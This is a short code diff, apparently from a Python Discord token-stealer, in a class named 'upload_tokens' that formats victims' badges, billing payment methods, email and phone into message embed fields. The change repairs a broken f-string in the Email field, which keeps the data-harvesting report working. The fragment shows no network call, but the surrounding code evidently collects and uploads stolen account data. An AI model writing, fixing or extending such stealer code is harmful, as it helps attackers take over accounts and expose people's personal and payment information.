@@ -347,7 +347,7 @@ class upload_tokens:
             embed.add_field(name="Badges", value=f"```{badges if badges != '' else 'None'}```", inline=True)
             embed.add_field(name="Billing", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=True)
 
-            embed.add_field(name="Email", value=f"{```email if email != None else 'None'}```", inline=True)
+            embed.add_field(name="Email", value=f"```{email if email != None else 'None'}```", inline=True)
             embed.add_field(name="Phone", value=f"```{phone if phone != None else 'None'}```", inline=True)    
 
 
